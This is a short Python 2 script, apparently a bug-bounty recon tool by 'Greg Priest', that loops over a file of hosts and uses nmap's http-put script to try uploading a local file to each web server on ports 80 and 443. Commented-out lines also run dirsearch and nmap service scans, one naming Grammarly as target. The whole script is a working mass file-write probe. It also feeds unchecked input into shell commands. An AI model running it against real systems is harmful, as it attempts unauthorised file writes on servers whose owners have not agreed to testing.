import sys
import os
from sys import argv

print '''
############################
#######	   Auto_.py    #####
#######	 Greg Priest   #####
############################
'''
iplist = argv[1]
print "[+] Wordlist: "+iplist
print "[+] in progress!" 
print "[+] Take RedBull and wait! ;]"
with open(iplist) as f:
	for line in f:
		for word in line.split():
			print word
#			os.system("python3 /root/tools/dirsearch/dirsearch.py -u "+word+" -e php,asp,jsp -b >> index.txt")
#			os.system("nmap -sV -PN "+word+" >> grammarly_nmap.txt")
			os.system("nmap -p 80,443 "+word+" --script http-put --script-args http-put.url='/h1gr3g.txt',http-put.file='/root/Documents/teszt.txt' >> att_PUT_write.txt")
